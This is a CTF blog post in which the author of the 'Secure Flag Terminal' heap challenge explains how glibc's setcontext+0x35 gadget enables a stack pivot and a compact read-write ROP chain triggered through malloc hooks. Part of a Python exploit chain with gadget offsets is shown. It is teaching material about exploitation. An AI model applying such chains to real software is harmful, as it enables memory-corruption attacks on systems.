---
title: ROP-ing with setcontext
date: 2024-08-31 10:00:00 -0500
categories: [pwn, ctf]
tags: [linux, pwn, ctf]
author: oreo
dsecription: ROP-ing with setcontext
---

## Introduction

While writing a heap pwn challenge for Sunshine CTF called "Secure Flag Terminal", I wanted to make my challenge more difficult than a traditional House of Force exploit. So I wrote a whitelist seccomp filter and stored the flag's fd on the heap (I randomized the fd to prevent easy cheesing); I did this to remove the use of *one_gadgets*, calling system, or a standard open/read/write chain that people might have prepared already. To solve the challenge, they basically needed to trigger a ROP chain through either `__malloc_hook` or `__free_hook`. I've never ROP-ed from the glibc hooks before, so I had to figure it out on the fly.

To write my solve script, I needed to find a suitable gadget, or chain of gadgets, to perform the following:

- Stack pivot
- Prepare args for my ROP chain
- Execute my ROP chain

> The stack pivot gagdet is arguably the most important component here, and finding a good one can be challenging at times.
{: .prompt-tip}

While searching, I found a very useful blog post by [Midas](https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/). It essentially demonstrates the utility of the Setcontext API in GLIBC (specifically `setcontext+0x35`) in performing the above requirements through a reliable open-read-write ROP chain that they wrote. Funnily enough, they recommend using it in the *context* of heap exploitation - nice pun right? My challenge utilizes a House of Force technique and tcache poisoning, so we have heap exploitation pretty well covered.

## My Implementation

Using the `setcontext+0x35` ROP gadget/chain, in my opinion, is almost equivalent to finding a one_gadget - especially if your intention isn't spawning a shell. It allows you to set basically all of the registers besides `rax` (unless you want to null it out).

![setcontext rop gadgets](/assets/images/setcontext/rop_gadgets.png)

> The stack pivot is here: `mov rsp, qword [rdi + 0xa0]`, and `RDI` is user-controlled!!
{: .prompt-info}

One thing I noticed in [Midas's](https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/) PoC is that it doesn't utilize all of the `mov r*, qword ptr [rdi+0x*];` instructions. Rather, they used what they needed and then added the rest of the chain afterwards. I felt that was a bit wasteful and not applicable in cases where your input size is restricted (like my challenge). As a result, I wrote a ROP chain entirely encased within the slew of `mov` instructions in this gadget:

```python
(...)

pop_rdi = 0x000000000002164f + libc.address # pop rdi; ret;
mov_rdi = 0x00000000000520c9 + libc.address # mov rdi, qword ptr [rdi + 0x68]; xor eax, eax; ret;
pop_rdx = 0x0000000000001b96 + libc.address # pop rdx; ret;
pop_rsi = 0x0000000000023a6a + libc.address # pop rsi; ret;
pop_rax = 0x000000000001b500 + libc.address # pop rax; ret;
syscall_ret = 0x00000000000d2625 + libc.address # syscall; ret;

# Call gadget for setcontext <-- hook malloc with this and do malloc(heap_ptr)
# setcontext will perform stack pivot to heap chunk
# Prime heap with rest of rop chain to perform read-write and win flag

chain = p64(libc.sym['setcontext'] + 0x35) # stack pivot + arg setup <-- [rdi] (chunk_ptr)
chain += p64(0) # read syscall value for rax                         <-- [rdi + 0x08]
chain += p64(mov_rdi) # dynamically determine fd from heap           <-- [rdi + 0x10]
chain += p64(syscall_ret) #                                          <-- [rdi + 0x18]
chain += p64(pop_rdi) #                                              <-- [rdi + 0x20]
chain += p64(0x1) # stdout                                           <-- [rdi + 0x28] = r8
chain += p64(pop_rsi) #                                              <-- [rdi + 0x30] = r9
chain += p64(chunk_ptr + 0x400) # buffer addr                        <-- [rdi + 0x38]
chain += p64(pop_rdx) #                                              <-- [rdi + 0x40]
chain += p64(0x24) # size to write                                   <-- [rdi + 0x48] = r12
chain += p64(pop_rax) #                                              <-- [rdi + 0x50] = r13
chain += p64(0x1) # sys_read                                         <-- [rdi + 0x58] = r14
chain += p64(syscall_ret) #                                          <-- [rdi + 0x60] = r15
chain += p64(fd - 0x68) # offsetted ptr for fd (see mov_rdi)         <-- [rdi + 0x68] = rdi
chain += p64(chunk_ptr + 0x400) # buffer addr for sys_read           <-- [rdi + 0x70] = rsi
chain += p64(0) * 2 # padding                                        <-- [rdi + 0x78/0x80] = rbp/rbx
chain += p64(0x24) # size to read (setcontext ROP -> sys_read)       <-- [rdi + 0x88] = rdx
chain += b'A' * 8 # padding                                          <-- [rdi + 0x90]
chain += b'B' * 8 # padding                                          <-- [rdi + 0x98] = rcx
chain += p64(chunk_ptr + 0x8) # heap buffer for stack pivot          <-- [rdi + 0xa0] = rsp
chain += p64(pop_rax) # for push rcx, sets rax for sys_read          <-- [rdi + 0xa8] = rcx

(...)
```

You can view the full exploit/solve script for my challenge [here](https://github.com/SunshineCTF/SunshineCTF-2024-Public/blob/main/Pwn/Secure_Flag_Terminal/solve.py).

Now, I don't think what I did is novel in any regard, but I'm quite proud of it and the fact that I was able to compress my ROP chain within the buffer required for `setcontext+0x35`.